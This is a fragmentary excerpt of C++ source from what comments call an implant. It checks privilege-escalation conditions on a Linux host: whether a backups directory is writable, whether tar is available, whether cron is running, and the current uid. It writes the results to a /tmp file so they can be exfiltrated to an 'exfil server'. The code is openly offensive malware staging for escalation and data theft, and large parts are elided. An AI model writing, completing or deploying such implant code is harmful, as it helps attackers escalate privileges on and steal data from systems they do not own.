 ...
 *
 * Additionally writes privesc viability check results to /tmp/privesc_check.txt
 * so the implant can exfiltrate them to the exfil server.
 *
...
// ----------------------------------------------------------------------
// Write privesc check results to a file for later exfiltration
// ----------------------------------------------------------------------
static void write_privesc_check(const PrivEscConditions& cond) {
    std::ofstream out("/tmp/privesc_check.txt");
    if (!out) return;
    out << "backups_dir_exists: " << (cond.backups_dir_exists ? "yes" : "no") << "\n";
    out << "backups_dir_writable: " << (cond.backups_dir_writable ? "yes" : "no") << "\n";
    out << "tar_available: " << (cond.tar_available ? "yes" : "no") << "\n";
    out << "cron_running: " << (cond.cron_running ? "yes" : "no") << "\n";
    out << "current_uid: " << cond.current_uid << "\n";
...
int main() {
    ...
    // --------------------------------------------------------------------
    // Write privesc check results for the implant to exfiltrate
    // --------------------------------------------------------------------
    write_privesc_check(cond);
